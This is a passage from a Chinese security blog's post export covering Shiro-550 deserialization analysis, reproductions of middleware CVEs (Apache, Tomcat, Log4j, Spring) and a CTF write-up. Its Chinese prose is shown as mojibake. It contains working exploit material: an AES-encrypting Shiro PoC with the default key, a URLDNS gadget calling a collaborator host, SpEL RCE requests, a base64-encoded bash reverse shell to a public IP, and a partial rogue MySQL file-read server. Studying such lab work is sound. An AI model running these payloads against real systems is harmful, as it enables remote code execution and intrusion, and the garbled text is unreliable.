&quot;]&quot;); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;); } return decoded; } else { //no cookie set - new site visitor? return null; } } è¿™ä¸ªçœ‹åå­—å°±çŸ¥é“æ˜¯è·å¾—æˆ‘ä»¬åŠ å¯†æœ€åä¸€æ­¥çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œbase64è§£ç ï¼Œæˆ‘ä»¬å¾€å›æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†å®ƒ public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null &amp;&amp; bytes.length &gt; 0) { principals = convertBytesToPrincipals(bytes, subjectContext); } } catch (RuntimeException re) { principals = onRememberedPrincipalFailure(re, subjectContext); } return principals;} å®ƒå¾—åˆ°æ•°æ®ä¹‹åï¼Œåˆè°ƒç”¨äº†convertBytesToPrincipals protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (getCipherService() != null) { bytes = decrypt(bytes); } return deserialize(bytes);} ä¸­é—´ä¸å¤šè¯´ï¼Œå°±æ˜¯è§£å¯†è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¹‹é—´è·Ÿè¿›åˆ°deserialize ä¸€ç›´è·Ÿè¿›ï¼Œæ‰¾åˆ°è°ƒç”¨å®ƒçš„æ–¹æ³• public Object deserialize(byte[] serialized) { if (serialized == null) { throw new IllegalArgumentException(&quot;Argument cannot be null.&quot;); } ByteArrayInputStream bis = new ByteArrayInputStream(serialized); XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(bis)); Object o = decoder.readObject(); decoder.close(); return o; }} å¾ˆå¥½ï¼Œè¿™é‡Œå°±æœ‰ä¸ªreadObjectï¼Œå¯ä»¥ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒï¼Œå»åˆ©ç”¨ä¸€äº›ä¾èµ–çš„æ¼æ´ï¼Œæ¯”å¦‚CCè¿˜æœ‰URLDNS ç”¨ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„exp # ï¼*-* coding:utf-8# @Time : 2022/7/13 17:36# @Author : Drunkbaby# @FileName: poc.py# @Software: VSCode# @Blog ï¼šhttps://drun1baby.github.io/import base64import uuidfrom Crypto.Cipher import AESdef get_file_data(filename): with open(filename, 'rb') as f: data = f.read() return datadef aes_enc(data): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))) return ciphertextdef aes_dec(enc_data): enc_data = base64.b64decode(enc_data) unpad = lambda s: s[:-s[-1]] key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = enc_data[:16] encryptor = AES.new(base64.b64decode(key), mode, iv) plaintext = encryptor.decrypt(enc_data[16:]) plaintext = unpad(plaintext) return plaintextif __name__ == &quot;__main__&quot;: data = get_file_data(&quot;/tmp/url.bin&quot;) print(aes_enc(data)) è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨URLDNSçš„é“¾å­,å› ä¸ºæ˜¯jdkåŸç”Ÿçš„ï¼Œä¸éœ€è¦ä»»ä½•ä¾èµ–ï¼Œæ–¹ä¾¿æ£€æµ‹ import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class URLDNS { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;http://5jp8y8o6rarvzt9un7j5n1b3muskg9.burpcollaborator.net&quot;); Class&lt;? extends URL&gt; cls = url.getClass(); Field hashCodeField = cls.getDeclaredField(&quot;hashCode&quot;); hashCodeField.setAccessible(true); hashCodeField.set(url, 3377); hashMap.put(url, 1); hashCodeField.set(url, -1); serialize(hashMap); // unserialize(&quot;url.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;url.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; }} è¦è®°å¾—åˆ é™¤JSESSIONIDï¼Œå¦åˆ™ä¸ä¼šå†å»æ ¡éªŒremembermeå­—æ®µ æ€»ç»“https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/ Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ_å“”å“©å“”å“©_bilibili æœ‰å…³RCEçš„éƒ¨åˆ†ä¸‹æ¬¡è¿›è¡Œè®¨è®º","link":"/2023/03/14/shiro1/"},{"title":"Webå¸¸è§ä¸­é—´ä»¶å¤ç°","text":"è®°å½•è‡ªå·±å¤ç°ä¸­é—´ä»¶æ¼æ´çš„ä¸€ç‚¹è®°å½• Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰åŸç†Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ ä¸Šä¼ ä¸€ä¸ª1.phpçš„æ–‡ä»¶ï¼Œç„¶åburpæŠ“åŒ…å¯ä»¥ä¿®æ”¹ï¼Œåœ¨1.phpåæ’å…¥ä¸€ä¸ª0a ä¾¿å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œå†è®¿é—®1.php%0aï¼Œå°±å¯ä»¥æ‰§è¡Œäº†phpæ–‡ä»¶ ä¿®å¤ å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ å¯¹ä¸Šä¼ æ–‡ä»¶é‡å‘½å ç¦ç”¨ä¸Šä¼ æ–‡ä»¶çš„æ‰§è¡Œæƒé™ Apache HTTPD å¤šåç¼€è§£ææ¼æ´åŸç†Apacheæ–‡ä»¶è§£ææ¼æ´æ¶‰åŠåˆ°ä¸€ä¸ªè§£ææ–‡ä»¶çš„ç‰¹æ€§ï¼š Apacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªä»¥ç‚¹åˆ†éš”çš„åç¼€ï¼Œå½“å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼Œåˆ™ç»§ç»­å‘å·¦è¯†åˆ«ï¼Œå½“æˆ‘ä»¬è¯·æ±‚è¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼šshell.xxx.yyy è‹¥ç»™.phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼š AddHandler application/x-httpd-php .php é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚ ä¿®å¤å°†AddHandler application/x-httpd-php .phpçš„é…ç½®æ–‡ä»¶åˆ é™¤ã€‚ åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼1ã€ä½¿ç”¨SetHandler,å†™å¥½æ­£åˆ™ &lt;FileMatch â€œ.+.php$â€&gt; SetHandler application/x-httpd-php 2ã€ç¦æ­¢.phpè¿™æ ·çš„æ–‡ä»¶æ‰§è¡Œ &lt;FileMatch â€œ.+.ph(p[3457]?|t|tml).â€&gt; Require all denied Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰åŸç†ç”±äºé…ç½®ä¸å½“ï¼ˆéé»˜è®¤é…ç½®ï¼‰ï¼Œå°†é…ç½®æ–‡ä»¶conf/web.xmlä¸­çš„readonlyè®¾ç½®ä¸ºäº† falseï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†é™åˆ¶äº†jspåç¼€çš„ä¸Šä¼  æ ¹æ®æè¿°ï¼Œåœ¨ Windows æœåŠ¡å™¨ä¸‹ï¼Œå°† readonly å‚æ•°è®¾ç½®ä¸º false æ—¶ï¼Œå³å¯é€šè¿‡ PUT æ–¹å¼åˆ›å»ºä¸€ä¸ª JSP æ–‡ä»¶ï¼Œå¹¶å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç  é€šè¿‡é˜…è¯» conf/web.xml æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°ï¼Œé»˜è®¤ readonly ä¸º trueï¼Œå½“ readonly è®¾ç½®ä¸º false æ—¶ï¼Œå¯ä»¥é€šè¿‡ PUT / DELETE è¿›è¡Œæ–‡ä»¶æ“æ§ æ­å»ºå¥½ç¯å¢ƒåå¯ä»¥ï¼Œè¿›å…¥dockerçš„shellé‡ŒæŸ¥çœ‹ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°readonlyæ˜¯falseï¼ŒæŠ“ä¸ªåŒ…ï¼Œæ”¹ä¸ºPUTçœ‹èƒ½å¦å†™å…¥ä¸€ä¸ªæ–‡ä»¶ çŠ¶æ€ç æ˜¯201ï¼Œåº”è¯¥æ˜¯å†™å…¥æˆåŠŸ äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å†™å…¥ä¸€ä¸ªjspæœ¨ğŸï¼Œç”¨èšå‰‘ç”Ÿæˆä¸€ä¸‹ï¼Œä½†æ˜¯ç›´æ¥ä¼ ï¼Œå‘ç°ä¼šæŠ¥404ï¼Œåº”è¯¥æ˜¯å¯¹jspæœ‰é™åˆ¶ ç»•è¿‡æ–¹å¼æœ‰ä¸‰ç§ Windowsä¸‹ä¸å…è®¸æ–‡ä»¶ä»¥ç©ºæ ¼ç»“å°¾ä»¥PUT /a001.jsp%20 HTTP/1.1ä¸Šä¼ åˆ° Windowsä¼šè¢«è‡ªåŠ¨å»æ‰æœ«å°¾ç©ºæ ¼ Windows NTFSæµPut/a001.jsp::$DATA HTTP/1.1 /åœ¨æ–‡ä»¶åä¸­æ˜¯éæ³•çš„ï¼Œä¹Ÿä¼šè¢«å»é™¤ï¼ˆLinux/Windowsï¼‰Put/a001.jsp/http:/1.1 ä¾¿å¯ä»¥ä¸Šä¼ æˆåŠŸ æ‹¿åˆ°shell ä¿®å¤æ£€æµ‹å½“å‰ç‰ˆæœ¬æ˜¯å¦åœ¨å½±å“èŒƒå›´å†…ï¼Œå¹¶ç¦ç”¨PUTæ–¹æ³•ã€‚ æ›´æ–°å¹¶å‡çº§è‡³æœ€æ–°ç‰ˆã€‚ æœ€å¥½çš„è§£å†³æ–¹å¼æ˜¯å°† conf/web.xml ä¸­å¯¹äº DefaultServlet çš„ readonly è®¾ç½®ä¸º trueï¼Œæ‰èƒ½é˜²æ­¢æ¼æ´ã€‚ Tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°waræ–‡ä»¶getshellæ¼æ´åŸç†Tomcat æ”¯æŒåœ¨åå°éƒ¨ç½²waræ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°†webshelléƒ¨ç½²åˆ°webç›®å½•ä¸‹ã€‚ è‹¥åå°ç®¡ç†é¡µé¢å­˜åœ¨å¼±å£ä»¤ï¼Œåˆ™å¯ä»¥é€šè¿‡çˆ†ç ´è·å–å¯†ç ã€‚ å¯åŠ¨ç¯å¢ƒåï¼Œè®¿é—®/manage/htmlå¯ä»¥è®¤è¯ç™»å½• ç»è¿‡base64ç¼–ç ï¼Œå¯ä»¥çˆ†ç ´å¼±å£ä»¤ï¼Œç™»å½•åï¼Œåœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸Šä¼ waråŒ…çš„åœ°æ–¹ ç”ŸæˆjspğŸåï¼Œç”¨jaræ‰“åŒ…æˆwaræ–‡ä»¶ ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®200ï¼Œåº”è¯¥æ²¡é—®é¢˜ æ‹¿åˆ°shell ä¿®å¤ åœ¨ç³»ç»Ÿä¸Šä»¥ä½æƒé™è¿è¡ŒTomcatåº”ç”¨ç¨‹åºã€‚åˆ›å»ºä¸€ä¸ªä¸“é—¨çš„ TomcatæœåŠ¡ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·åªèƒ½æ‹¥æœ‰ä¸€ç»„æœ€å°æƒé™ï¼ˆä¾‹å¦‚ä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰ã€‚ å¢åŠ å¯¹äºæœ¬åœ°å’ŒåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯ï¼Œéƒ¨ç½²è´¦æˆ·é”å®šæœºåˆ¶ï¼ˆå¯¹äºé›†ä¸­å¼è®¤è¯ï¼Œç›®å½•æœåŠ¡ä¹Ÿè¦åšç›¸åº”é…ç½®ï¼‰ã€‚åœ¨CATALINA_HOME/conf/web.xmlæ–‡ä»¶è®¾ç½®é”å®šæœºåˆ¶å’Œæ—¶é—´è¶…æ—¶é™åˆ¶ã€‚ ä»¥åŠé’ˆå¯¹manager-gui/manager-status/manager-scriptç­‰ç›®å½•é¡µé¢è®¾ç½®æœ€å°æƒé™è®¿é—®é™åˆ¶ã€‚ åå°ç®¡ç†é¿å…å¼±å£ä»¤ã€‚ Weblogic WLS Core Components ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰åŸç† å¤ç° ä¿®å¤æ‰“è¡¥ä¸ åœ¨ç»â¼¤å¤šæ•°åº”â½¤çš„ä½¿â½¤åœºæ™¯ä¸­ï¼Œâ½¤æˆ·åªéœ€è¦åœ¨å…¬â½¹èƒ½å¤Ÿä½¿â½¤HTTP(S)åè®®è®¿é—®webåº”â½¤æœåŠ¡å™¨å³å¯ã€‚ å¯¹äºweblogicæœåŠ¡å™¨ï¼Œåœ¨ç»â¼¤å¤šæ•°æƒ…å†µä¸‹ï¼Œåªéœ€è¦èƒ½å¤Ÿåœ¨å…¬â½¹è®¿é—®weblogicæä¾›çš„HTTP(S)åè®®çš„æœåŠ¡å³å¯ï¼Œå¹¶ä¸éœ€è¦è®¿é—®T3åè®®ã€‚å°‘æ•°æƒ…å†µä¸‹ï¼Œè¿ç»´â¼ˆå‘˜éœ€è¦ä½¿â½¤weblogicçš„T3åè®®ï¼š åœ¨weblogicæœåŠ¡å™¨æœ¬æœºæ‰§â¾weblogicçš„åœâ½Œè„šæœ¬ï¼› é€šè¿‡WLSTå¯¹weblogicè¿›â¾è„šæœ¬åŒ–é…ç½®ï¼› ç¼–å†™ä½¿â½¤T3åè®®é€šä¿¡çš„ç¨‹åºå¯¹weblogicè¿›â¾çŠ¶æ€ç›‘æ§åŠå…¶ä»–ç®¡ç†åŠŸèƒ½ã€‚ T3åè®®ä¸HTTPåè®®å‡åŸºäºTCPåè®®ï¼ŒT3åè®®ä»¥â€t3â€³å¼€å¤´ï¼ŒHTTPåè®®ä»¥â€œGETâ€ã€â€œPOSTâ€ç­‰å¼€å¤´ï¼Œä¸¤è€…æœ‰æ˜æ˜¾çš„åŒºåˆ«ã€‚å› æ­¤å¯ä»¥é™å®šåªå…è®¸ç‰¹å®šæœåŠ¡å™¨è®¿é—®weblogicæœåŠ¡å™¨çš„T3åè®®ï¼Œèƒ½å¤Ÿä¿®å¤weblogicçš„JAVAååºåˆ—åŒ–æ¼æ´ã€‚å³ä½¿ä»Šåå‘ç°äº†weblogicçš„å…¶ä»–ç±»å­˜åœ¨JAVAååºåˆ—åŒ–æ¼æ´ï¼Œä¹Ÿèƒ½å¤Ÿé˜²æŠ¤ Apache Log4j2 lookup JNDI æ³¨å…¥æ¼æ´(CVE-2021-44228)åŸç†Apache Log4jæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ—¥å¿—è®°å½•ç»„ä»¶ï¼Œé€šè¿‡é‡å†™Log4jå¼•å…¥äº†ä¸°å¯Œçš„åŠŸèƒ½ç‰¹æ€§ï¼Œè¯¥æ—¥å¿—ç»„ä»¶è¢«å¹¿æ³›åº”ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨ä»¥è®°å½•ç¨‹åºè¾“å…¥è¾“å‡ºæ—¥å¿—ä¿¡æ¯ã€‚ ä¸»è¦ç”±äºå®ƒlog4j2æä¾›äº†lookupçš„åŠŸèƒ½ æ—¥å¿—ä¸­åŒ…å« ${},lookupåŠŸèƒ½å°±ä¼šå°†è¡¨è¾¾å¼çš„å†…å®¹æ›¿æ¢ä¸ºè¡¨è¾¾å¼è§£æåçš„å†…å®¹ï¼Œè€Œä¸æ˜¯è¡¨è¾¾å¼æœ¬èº«ã€‚ å¸¸è§çš„è§£ææœ‰ï¼š ${ctx:loginId}${map:type}${filename}${date:MM-dd-yyyy}${docker:containerId}${docker:containerName}${docker:imageName}${env:USER}${event:Marker}${mdc:UserId}${java}${jndi:logging/context-name}${hostName}${docker:containerId}${k8s}${log4j}${main}${name}${marker}${spring}${sys:logPath}${web:rootDir} é™¤äº†è¿™ä¸ªè§£æï¼Œè¿˜æœ‰æ¶‰åŠåˆ°ä¸€ä¸ªjndiæ³¨å…¥ å¤ç°å¯åŠ¨ç¯å¢ƒåï¼Œæˆ‘ä»¬åœ¨ç®¡ç†å‘˜æ¥å£çš„actionå‚æ•°å¤„è¿›è¡Œæ¼æ´åˆ©ç”¨ åœ¨dnså¹³å°å¯ä»¥æ”¶åˆ°å›æ˜¾ è¿›ä¸€æ­¥åˆ©ç”¨å¯ä»¥è¿ç”¨è¿™ä¸¤ä¸ªå·¥å…· JNDI æ³¨å…¥åˆ©ç”¨å·¥å…· JNDI-Injection-Exploit åˆ©ç”¨å¦‚ä¸‹ ä¿®å¤ Apacheå®˜æ–¹å·²å‘å¸ƒæ–°ç‰ˆæœ¬å®Œæˆæ¼æ´ä¿®å¤ï¼Œå»ºè®®åŠæ—¶å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬ æ·»åŠ jvmå¯åŠ¨å‚æ•°-Dlog4j2.formatMsgNoLookups=true åœ¨åº”ç”¨classpathä¸‹æ·»åŠ log4j2.component.propertiesé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºlog4j2.formatMsgNoLookups=trueï¼› JDKä½¿ç”¨11.0.1ã€8u191ã€7u201ã€6u211åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ï¼› éƒ¨ç½²ä½¿ç”¨ç¬¬ä¸‰æ–¹é˜²ç«å¢™äº§å“è¿›è¡Œå®‰å…¨é˜²æŠ¤ã€‚ Spring Cloud Function SpELè¡¨è¾¾å¼å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰åŸç†Spring Cloud Functionå°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-expressionâ€å‚æ•°ä½œä¸º SpELè¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ å¤ç°å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… POST /functionRouter HTTP/1.1Host: 123.58.236.76User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMS40MS4xMjIuNzMvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)Content-Type: application/x-www-form-urlencodedContent-Length: 4test ç­‰å¾…ä¸€ä¼šåœ¨vpsä¸Šå¾—åˆ°å›è¿ ä¿®å¤æ ¹æ®ä¸šåŠ¡æƒ…å†µï¼Œæ›´æ–°ç‰ˆæœ¬ä¿®å¤ Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)åŸç†Spring cloud GateWayçš„actuatorç›¸å…³ç«¯ç‚¹ï¼š è·å–æ‰€æœ‰è·¯ç”±ï¼šGetè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/ æ·»åŠ è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å· åˆ é™¤è·¯ç”±ï¼šDELETEè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å· è·å–æŒ‡å®šè·¯ç”±ï¼šGETè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å· åˆ·æ–°è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/refresh å…¶ä¸­ï¼Œè°ƒç”¨æ·»åŠ è·¯ç”±çš„ç«¯ç‚¹æ—¶ï¼Œå¯ä»¥å‘è·¯ç”±ä¸­åŠ å…¥filtersï¼Œè¿‡æ»¤å™¨çš„å€¼å…è®¸ä¸ºspELè¡¨è¾¾å¼ï¼Œä¸”ä¼šè§£æè¿™ä¸ªspELè¡¨è¾¾å¼ã€‚å¯ä»¥é€šè¿‡æ„é€ spELè¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ„é€ çš„filterså¯ä»¥ç›´æ¥åˆ©ç”¨gatewayè‡ªå¸¦çš„AddResponseHeaderï¼Œå°†spELçš„æ‰§è¡Œç»“æœæ·»åŠ åˆ°å“åº”å¤´ä¸­ï¼Œç›´æ¥é€šè¿‡å“åº”å¤´è¿›è¡ŒæŸ¥çœ‹ã€‚ å¤ç°ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼Œå‘é€æ¶æ„çš„SpELè¡¨è¾¾å¼çš„è·¯ç”± POST /actuator/gateway/routes/qqw HTTP/1.1Host: 123.58.236.76:49135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Language: enContent-Type: application/jsonContent-Length: 361{ &quot;id&quot;: &quot;qqw&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: {&quot;name&quot;: &quot;Result&quot;,&quot;value&quot;: &quot;#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;} }], &quot;uri&quot;: &quot;http://example.com&quot;, &quot;order&quot;: 0 } ç¬¬äºŒä¸ªè¯·æ±‚åˆ·æ–° POST /actuator/gateway/refresh HTTP/1.1Host: 123.58.236.76:49135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Language: enContent-Type: application/jsonContent-Length: 0 ç„¶åè®¿é—®ï¼Œä¹‹å‰æ¶æ„è¯·æ±‚çš„è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æ‰§è¡Œäº†å‘½ä»¤ ä¿®å¤ å¦‚æœä¸éœ€è¦Actuatorï¼Œå¯ä»¥é€šè¿‡management.endpoint.gateway.enableï¼šfalseé…ç½®å°†å…¶ç¦ç”¨ã€‚ å¦‚æœéœ€è¦Actuatorï¼Œåˆ™åº”ä½¿ç”¨Spring Securityå¯¹å…¶è¿›è¡Œä¿æŠ¤ã€‚ å®˜æ–¹å·²å‘å¸ƒæ¼æ´è¡¥ä¸åŠä¿®å¤ç‰ˆæœ¬ï¼Œè¯·è¯„ä¼°ä¸šåŠ¡æ˜¯å¦å—å½±å“åï¼Œé…Œæƒ…å‡çº§è‡³å®‰å…¨ç‰ˆæœ¬ã€‚","link":"/2022/06/10/vul/"},{"title":"NSSRound3---This1sMysql å¤ç°","text":"æ˜¯NSSå¹³å°çš„ç¬¬ä¸‰è½®æ¯”èµ›ï¼Œä¹Ÿæ˜¯ä»è¿™é¢˜é‡Œå­¦åˆ°äº†å¾ˆå¤šï¼Œé¢˜ç›®é“¾æ¥åœ¨ä¸‹é¢https://www.ctfer.vip/#/problem/sheet/2265 çŸ¥è¯†ç‚¹ Rogue-MySql-Server åˆ©ç”¨SQLç›²æ³¨æ³¨å…¥å‡ºç›®å½• MySQLå†™å…¥æ–‡ä»¶ POPé“¾æ„é€  pharä¼ªåè®®çš„åˆ©ç”¨ é¢˜è§£ä¸€æ¥å°±ç»™äº†æºç ï¼Œçœ‹æ“ä½œæ˜¯ä¸€ä¸ªé“¾æ¥æ•°æ®åº“ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®åº“è¿æ¥çš„å‚æ•°æˆ‘ä»¬éƒ½å¯æ§ ç†Ÿæ‚‰çš„å¸ˆå‚…çŸ¥é“è¿™å°±éœ€è¦åˆ©ç”¨Rogue-MySql-Serverè¿™ä¸ªæŠ€æœ¯ï¼ˆæˆ‘ä¸ç†Ÿæ‚‰ å¯ä»¥å‚è€ƒhttps://baijiahao.baidu.com/s?id=1728256347925725724&amp;wfr=spider&amp;for=pc æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹è„šæœ¬å»è¯»å–æ–‡ä»¶ from socket import AF_INET, SOCK_STREAM, errorfrom asyncore import dispatcher, loop as _asyLoopfrom asynchat import async_chatfrom struct import Structfrom sys import version_infofrom logging import getLogger, INFO, StreamHandler, Formatter_rouge_mysql_sever_read_file_result = {}_rouge_mysql_server_read_file_end = Falsedef checkVersionPy3(): return not version_info &lt; (3, 0)def rouge_mysql_sever_read_file(fileName, port, showInfo): if showInfo: log = getLogger(__name__) log.setLevel(INFO) tmp_format = StreamHandler() tmp_format.setFormatter(Formatter(&quot;%(asctime)s : %(levelname)s : %(message)s&quot;)) log.addHandler( tmp_format ) def _infoShow(*args): if showInfo: log.info(*args) # ================================================ # =======No need to change after this lines======= # ================================================ __author__ = 'Gifts' __modify__ = 'Morouu' global _rouge_mysql_sever_read_file_result class _LastPacket(Exception): pass class _OutOfOrder(Exception): pass class _MysqlPacket(object): packet_header = Struct('&lt;Hbb') packet_header_long = Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, _MysqlPacket): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num) else: header = _MysqlPacket.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = &quot;&quot;.join( ( header.decode(&quot;latin1&quot;) if checkVersionPy3() else header, self.payload ) ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0]) payload = raw_data[1:] return _MysqlPacket(packet_num, payload.decode(&quot;latin1&quot;) if checkVersionPy3() else payload) class _HttpRequestHandler(async_chat): def __init__(self, addr): async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.stateList = [b&quot;LEN&quot;, b&quot;Auth&quot;, b&quot;Data&quot;, b&quot;MoreLength&quot;, b&quot;File&quot;] if checkVersionPy3() else [&quot;LEN&quot;, &quot;Auth&quot;, &quot;Data&quot;, &quot;MoreLength&quot;, &quot;File&quot;] self.state = self.stateList[0] self.sub_state = self.stateList[1] self.logined = False self.file = &quot;&quot; self.push( _MysqlPacket( 0, &quot;&quot;.join(( '\\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\\0', 